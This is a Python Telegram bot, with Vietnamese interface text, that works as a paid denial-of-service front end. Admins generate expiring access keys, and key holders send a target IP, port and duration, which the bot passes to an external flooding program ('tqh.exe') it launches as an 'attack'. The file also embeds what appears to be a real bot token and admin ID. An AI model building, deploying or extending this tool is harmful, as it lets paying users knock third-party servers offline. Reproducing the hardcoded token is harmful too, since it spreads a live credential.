import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Insert your Telegram bot token here
BOT_TOKEN = '7745476271:AAFMihsOmoo83JczpBFnhPiUDSVVuaetaOs'
 
# Admin user IDs
ADMIN_IDS = {"6585637630"}


USER_FILE = "users.json"
KEY_FILE = "keys.json"

flooding_process = None
flooding_command = None


DEFAULT_THREADS = 15


users = {}
keys = {}


def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Lỗi không thể tải dữ liệu người dùng: {e} ⁉️")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# Command to generate keys
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Thời gian không hợp lệ!")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"🔑 Đã tạo key: `{key}`\n⏳ Hết hạn vào: {expiration_date}"
            except ValueError:
                response = "⚠️ Vui lòng nhập số lượng và đơn vị thời gian hợp lệ (hours/days)."
        else:
            response = "❓ Cách dùng: `/genkey <số lượng> <hours/days>`"
    else:
        response = "🚫 Bạn không có quyền sử dụng lệnh này!"
    await update.message.reply_text(response, parse_mode='Markdown')


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"✅ Đổi key thành công!\n🔓 Quyền truy cập có hiệu lực đến: {users[user_id]}"
        else:
            response = "❌ Key không hợp lệ hoặc đã hết hạn!"
    else:
        response = "❓ Cách dùng: `/redeem <key>`"
    await update.message.reply_text(response, parse_mode='Markdown')


async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = "👥 Danh sách người dùng có quyền truy cập:\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"🔹 @{username} (ID: {user_id}) - ⏳ Hết hạn: {expiration_date}\n"
                except Exception:
                    response += f"🔹 ID: {user_id} - ⏳ Hết hạn: {expiration_date}\n"
        else:
            response = "📭 Không có dữ liệu người dùng."
    else:
        response = "🚫 Bạn không có quyền sử dụng lệnh này!"
    await update.message.reply_text(response)


async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Quyền truy cập đã hết hạn hoặc chưa được cấp phép. Vui lòng nhập key hợp lệ.")
        return

    if len(context.args) != 3:
        await update.message.reply_text('❓ Cách dùng: `/set <IP> <Port> <Thời gian>`')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['tqh.exe', target_ip, port, duration]
    await update.message.reply_text(f'🎯 Mục tiêu: `{target_ip}:{port}`\n⏳ Thời gian: {duration} giây\n⚡ Số luồng: {DEFAULT_THREADS}', parse_mode='Markdown')


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Quyền truy cập đã hết hạn hoặc chưa được cấp phép. Vui lòng nhập key hợp lệ.")
        return

    if flooding_process is not None:
        await update.message.reply_text('⚠️ Hiện tại đang có một quá trình chạy.')
        return

    if flooding_command is None:
        await update.message.reply_text('⚠️ Bạn chưa thiết lập tham số! Hãy dùng lệnh `/bgmi`.')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('🚀 Đã bắt đầu quá trình tấn công!')


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Quyền truy cập đã hết hạn hoặc chưa được cấp phép. Vui lòng nhập key hợp lệ.")
        return

    if flooding_process is None:
        await update.message.reply_text('⚠️ Không có quá trình nào đang chạy!')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('🛑 Đã dừng quá trình tấn công!')


async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text('❓ Cách dùng: `/broadcast <nội dung>`')
            return

        for user in users.keys():
            try:
                await context.bot.send_message(chat_id=int(user), text=f"📢 Thông báo từ Admin:\n{message}")
            except Exception as e:
                print(f"Lỗi khi gửi tin nhắn tới {user}: {e}")
        response = "📬 Đã gửi thông báo đến tất cả người dùng!"
    else:
        response = "🚫 Bạn không có quyền sử dụng lệnh này!"
    
    await update.message.reply_text(response)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = (
        "🔹 *Hướng dẫn sử dụng bot*\n\n"
        "🔑 *Lệnh dành cho Admin:*\n"
        "➖ `/genkey <số lượng> <hours/days>` - Tạo key truy cập.\n"
        "➖ `/allusers` - Xem danh sách người dùng.\n"
        "➖ `/broadcast <nội dung>` - Gửi thông báo đến tất cả người dùng.\n\n"
        "👤 *Lệnh dành cho người dùng:*\n"
        "➖ `/redeem <key>` - Nhập key để kích hoạt quyền truy cập.\n"
        "➖ `/set <IP> <Port> <Thời gian>` - Thiết lập thông số tấn công.\n"
        "➖ `/start` - Bắt đầu tấn công.\n"
        "➖ `/stop` - Dừng tấn công.\n"
    )
    await update.message.reply_text(response, parse_mode='Markdown')

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("set", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("help", help_command))

    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()
